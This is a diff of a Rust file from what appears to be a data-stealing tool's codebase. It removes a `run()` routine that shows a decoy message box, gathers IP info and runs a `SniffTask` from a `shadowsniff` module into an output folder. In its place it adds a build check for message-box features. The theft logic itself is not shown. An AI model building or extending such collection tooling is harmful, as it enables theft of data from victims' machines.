@@ -23,43 +23,13 @@
  * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
  * SOFTWARE.
  */
+use std::env;
 
-use alloc::format;
-use collector::atomic::AtomicCollector;
-use collector::display::PrimitiveDisplayCollector;
-use filesystem::path::Path;
-use filesystem::storage::StorageFileSystem;
-use filesystem::{FileSystem, FileSystemExt};
-use ipinfo::init_ip_info;
-use shadowsniff::SniffTask;
-use tasks::Task;
-use utils::log_debug;
+fn main() {
+    let before = env::var("CARGO_FEATURE_MESSAGE_BOX_BEFORE_EXECUTION").is_ok();
+    let after = env::var("CARGO_FEATURE_MESSAGE_BOX_AFTER_EXECUTION").is_ok();
 
-#[inline(always)]
-pub fn run() {
-    if !init_ip_info() {
-        panic!()
+    if before && after {
+        panic!("Only one of `message_box_before_execution` or `message_box_after_execution` can be enabled at a time.");
     }
-
-    unsafe {
-        windows_sys::Win32::UI::WindowsAndMessaging::MessageBoxA(
-            core::ptr::null_mut(),
-            c"asd".as_ptr() as _,
-            c"asd".as_ptr() as _,
-            0
-        );
-    }
-
-    let fs = StorageFileSystem;
-    let out = &Path::new("output");
-    let _ = fs.remove_dir_all(out);
-    let _ = fs.mkdir(out);
-
-    let collector = AtomicCollector::default();
-
-    SniffTask::default().run(out, &fs, &collector);
-
-    let displayed_collector = format!("{}", PrimitiveDisplayCollector(&collector));
-
-    log_debug!("{displayed_collector}");
 }
